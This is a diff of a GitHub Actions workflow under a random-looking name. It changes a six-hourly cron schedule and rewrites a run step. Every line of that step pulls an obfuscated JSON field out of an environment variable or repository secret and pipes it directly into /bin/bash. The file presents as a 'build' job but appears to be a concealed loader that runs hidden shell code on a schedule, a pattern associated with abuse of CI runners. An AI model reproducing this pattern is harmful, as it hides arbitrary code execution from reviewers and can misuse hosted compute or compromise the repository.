@@ -1,28 +1,30 @@
 name: changweiwu3891
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
+    - cron: '34 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changweiwu3891
         env:
-          vtkut206: ${{ secrets.vtkut206 }}
+          v9: ${{ secrets.v9 }}
         run: |
-          echo $vtkut206 | jq -r .hx0338 | /bin/bash
-          echo $qwxp9 | jq -r .d961 | /bin/bash
-          echo $a3487 | jq -r .tcpq380 | /bin/bash
-          echo $nphl5 | jq -r .en04 | /bin/bash
-          echo $waa992 | jq -r .lpqvn694 | /bin/bash
-          echo $kfdd9 | jq -r .qzmj6 | /bin/bash
-          echo $xwozr14396 | jq -r .pjujt2360 | /bin/bash
-          echo $h5040 | jq -r .vrod120 | /bin/bash
-          echo $ujpss49700 | jq -r .hx9 | /bin/bash
-          echo $e1873 | jq -r .nqyh6058 | /bin/bash
-          echo $ewz0 | jq -r .gy32104 | /bin/bash
-          echo $ft024 | jq -r .m45361 | /bin/bash
+          echo $v9 | jq -r .dvu44 | /bin/bash
+          echo $mclr78796 | jq -r .pf05 | /bin/bash
+          echo $xxg03689 | jq -r .b480 | /bin/bash
+          echo $xoxxr29193 | jq -r .iax85 | /bin/bash
+          echo $bg564 | jq -r .s96458 | /bin/bash
+          echo $cdux4 | jq -r .xmxem7071 | /bin/bash
+          echo $s836 | jq -r .x138 | /bin/bash
+          echo $ul2 | jq -r .i3 | /bin/bash
+          echo $lnny773 | jq -r .na44 | /bin/bash
+          echo $objcl0 | jq -r .cvhb21 | /bin/bash
+          echo $yp61520 | jq -r .u95584 | /bin/bash
+          echo $kxd31514 | jq -r .ubdxy3865 | /bin/bash
+          echo $gpdzb444 | jq -r .zu803 | /bin/bash
+          echo $xqt40972 | jq -r .alo8927 | /bin/bash
 
